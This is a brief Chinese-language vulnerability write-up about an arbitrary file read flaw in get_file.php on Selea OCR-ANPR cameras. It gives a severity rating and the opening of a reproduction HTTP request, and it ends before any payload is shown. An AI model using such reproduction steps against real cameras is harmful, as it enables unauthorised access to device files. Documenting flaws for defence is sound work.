# Selea OCR-ANPR摄像机 get_file.php 任意文件读取漏洞

## 漏洞描述
Selea OCR-ANPR摄像机 get_file.php存在 任意文件读取漏洞，通过构造特殊请求获取服务器文件

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
登录页面如下

![](images/202202140933858.png)

发送如下请求包

```plain
POST /cgi-bin/get_file.php HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
